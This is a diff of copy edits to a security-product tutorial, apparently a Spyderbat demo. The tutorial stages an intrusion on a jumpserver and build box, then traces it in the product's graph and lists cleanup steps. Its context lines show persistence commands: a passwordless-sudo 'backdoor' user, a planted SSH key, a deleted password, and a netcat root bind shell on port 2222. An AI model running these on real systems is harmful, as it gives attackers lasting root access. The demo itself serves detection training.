@@ -29,7 +29,7 @@ User ec2-user may run the following commands on jumpserver:
     (ALL) NOPASSWD: ALL
 ```
 
-Looks like we have full sudo access to this machine (and we don't even need to know the password). So, let's make a new user to be able to get back into this machine, just in case the ssh key gets rotated. First, add the user:
+Looks like we have full sudo access to this machine (and we don't even need to know the password). So, let's make a new user to be able to get back into this machine, just in case the SSH key gets rotated. First, add the user:
 
 ```sh
 sudo adduser backdoor
@@ -60,19 +60,19 @@ User backdoor may run the following commands on jumpserver:
     (ALL) NOPASSWD: ALL
 ```
 
-Now that the user is set up, add an ssh key for them:
+Now that the user is set up, add an SSH key for them:
 
 ```sh
 ssh-keygen -f ~/.ssh/id
 ```
 
-Add that ssh key to the authorized keys:
+Add that SSH key to the authorized keys:
 
 ```sh
 cat ~/.ssh/id.pub >> ~/.ssh/authorized_keys
 ```
 
-And then print the key so we could copy it to use later. You don't need to save this anywhere, as we won't need it for this demo.
+Lastly, let's print the key so we have it to use later. You don't need to save this anywhere, as we won't need it again for this demo.
 
 ```sh
 cat ~/.ssh/id
@@ -131,7 +131,7 @@ In this case, let's just delete the user's password to make it easy to log in as
 sudo passwd -d backdoor
 ```
 
-If we look at the history on this machine, we can see that it has been used to pull down remote git repositories, build them, and push the finished containers:
+If we look at the history of this machine, we can see that it has been used to pull down remote git repositories, build them, and push the finished containers:
 
 ```sh
 history
@@ -155,7 +155,7 @@ history
    16  history
 ```
 
-Given the build server is fetching private code using SSH, we could use the SSH keys here to log in to GitHub and view the company's repositories:
+Given that the build server is fetching private code using SSH, we could use the SSH keys here to log in to GitHub and view the company's repositories:
 
 ```sh
 ls ~/.ssh/
@@ -176,7 +176,7 @@ ls ~/payroll-app/
 cat payroll-app/Makefile
 ```
 
-Given the access on this machine, we could edit the `payroll-app` package to add a backdoor that we could access, and then push a new version of the package. Alternatively, we can set up a secondary backdoor method using netcat. However, we will need to install it:
+Given the access on this machine, we could edit the `payroll-app` package to add a backdoor that we could access, and then push a new version of the package. Alternatively, we can set up a secondary backdoor method using Netcat. However, we will need to install it:
 
 If your machine is an Ubuntu-based OS:
 
@@ -195,7 +195,7 @@ And validate that we can use `nc`:
 which nc
 ```
 
-Then, we can start a listening port set up to connect us to a root shell, and disown the process so it stays around when we leave.
+We can start a listening port configured to connect us to a root shell, then disown the process so it stays around when we leave.
 
 ```sh
 sudo nc -l -p 2222 -e "/bin/bash" &
@@ -241,7 +241,7 @@ Your view should look similar to the trace above. If it does not, make sure you 
 
 To clean up the graph, we can select some of the larger trees and trim them using the "Remove X Descendants" in the right-click menu. For example, in the graph above I removed the children under `adduser` and `yum`.
 
-From this graph, we can easily see that the attacker originally connected to the jumpserver from an external IP. From there, they added a new user, and connected to the build box with SSH. After investigating the build box, they started a new netcat backdoor. Even though it was disowned, Spyderbat still tracks where the process came from, and the connections and future commands run with it.
+From this graph, we can easily see that the attacker originally connected to the jumpserver from an external IP. From there, they added a new user and connected to the build box with SSH. After investigating the build box, they started a new Netcat backdoor. Even though it was disowned, Spyderbat still tracks where the process came from, and the connections and future commands run with it.
 
 ![A focused view of the netcat process](./nc_details.png)
 
@@ -252,11 +252,11 @@ Now that we know the attacker's method of access and persistence method, we can 
 - kill the remaining Netcat process
 - rotate both machines' SSH keys
 - remove the backdoor user from both systems
-- remove netcat from the build system
+- remove Netcat from the build system
 
 > **Note:**
 >
-> The uninstall script will automatically perform some of these clean up actions to help reset the demo machines.
+> The uninstall script will automatically perform some of these clean-up actions to help reset the demo machines.
 
 ## Further Reading
 
